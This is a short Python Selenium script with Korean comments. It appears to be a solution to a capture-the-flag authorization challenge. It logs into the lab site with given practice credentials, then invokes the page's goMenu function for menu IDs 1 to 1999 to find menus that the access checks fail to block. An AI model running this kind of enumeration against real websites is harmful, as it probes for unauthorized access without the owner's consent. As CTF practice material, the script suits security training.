from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.alert import Alert
import time

# Chrome 웹드라이버 경로 설정 (자동으로 최신 드라이버 다운로드)
service = Service(ChromeDriverManager().install())

# 웹드라이버 초기화
driver = webdriver.Chrome(service=service)

# 웹사이트로 이동
url = 'http://ctf.segfaulthub.com:3481/auth3/index.php' 
driver.get(url)

# 로그인 과정이 필요하면 여기에 로그인 코드 추가 (로그인 필요 시)
driver.find_element(By.NAME, 'UserId').send_keys('sfUser')
driver.find_element(By.NAME, 'Password').send_keys('sfUser1234')
driver.find_element(By.NAME, 'Submit').click()

# 1에서 2000까지 버튼 클릭 자동화
for menu_id in range(1, 2000):
    try:
        driver.execute_script(f"goMenu('{menu_id}', '')")

        # 잠시 대기 (버튼 클릭 후 처리될 시간 주기)
        time.sleep(0.01)

        # alert 처리 - 알림창이 뜨면 해당 텍스트를 추출
        try:
            alert = Alert(driver)
            alert_text = alert.text  # alert 텍스트 가져오기
            alert.accept()  # alert 닫기
            if '권한이 없습니다.' in alert_text or '없는 메뉴입니다.' in alert_text:
                print(f"메뉴 {menu_id}: ") 
            else:
                print(f"메뉴 {menu_id}: {alert_text}")

        except:
            print(f"메뉴 {menu_id}: 알림창이 없습니다.")


    except Exception as e:
        print(f"메뉴 {menu_id} 버튼 클릭 실패: {e}")

# 브라우저 닫기
driver.quit()
